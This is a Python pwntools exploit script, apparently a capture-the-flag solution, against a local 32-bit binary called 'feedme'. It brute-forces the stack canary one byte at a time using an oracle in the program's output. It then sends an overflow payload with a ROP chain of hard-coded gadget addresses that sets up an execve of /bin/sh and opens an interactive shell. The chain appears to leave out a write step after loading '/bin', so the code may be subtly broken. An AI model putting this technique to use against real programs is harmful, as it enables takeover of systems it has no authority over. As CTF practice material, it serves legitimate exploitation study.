from pwn import * 

target=process("./feedme")


def breakCanary():
    known_canary = "\x00"
    hex_canary = "00"
    canary = 0x0
    inp_bytes = 34 
    for j in range(0, 3):
        for i in xrange(0xff):
            log.info("Trying canary: " + hex(canary) + hex_canary)
            
            target.send(p32(inp_bytes)[0])

            # Send this iterations canary
            target.send("a"*32 + known_canary + p32(canary)[0])

            # Scan in the output, determine if we have a correct value
            output = target.recvuntil("exit.")
            if "YUM" in output:
                # If we have a correct value, record the canary value, reset the canary value, and move on
                print "next byte is: " + hex(canary)
                known_canary = known_canary + p32(canary)[0]
                inp_bytes = inp_bytes + 1
                new_canary = hex(canary)
                new_canary = new_canary.replace("0x", "")
                hex_canary = new_canary + hex_canary
                canary = 0x0
                break
            else:
                # If this isn't the canary value, increment canary by one and move onto next loop
                canary = canary + 0x1

    return int(hex_canary, 16)

canary = breakCanary()
log.info("Canary found****: ",hex(canary))

#eax(11)
#ebx(/bin/sh)
#ecx edx null
pop_eax = 0x080bb496 #: pop eax ; ret
pop_ecx_ebx = 0x0806f371 #: pop ecx ; pop ebx ; ret
pop_edx = 0x0806f34a #: pop edx ; ret


syscall = 0x0806328d #: syscall

memory = 0x80eb010 

movGadjet = 0x0809a7ed #: mov dword ptr [edx], eax ; ret

rop = ''
rop += p32(pop_edx)
rop += p32(memory) #memory location
rop += p32(pop_eax)
rop += p32(0x6e69622f) #/bin 

rop += p32(pop_edx)
rop += p32(memory + 0x4)
rop += p32(pop_eax)
rop += p32(0x0068732f) #/sh\x00
rop += p32(movGadjet)

rop += p32(pop_eax)
rop += p32(0xb)
rop += p32(pop_ecx_ebx)
rop += p32(0x0)
rop += p32(memory)
rop += p32(pop_edx)
rop += p32(0x0)

rop += p32(syscall)

payload = ''
payload += 'A' * 32
payload += p32(canary)
payload += 'B' * 12
payload += rop

#total do payload
target.send("\x78")

target.send(payload)
target.interactive()


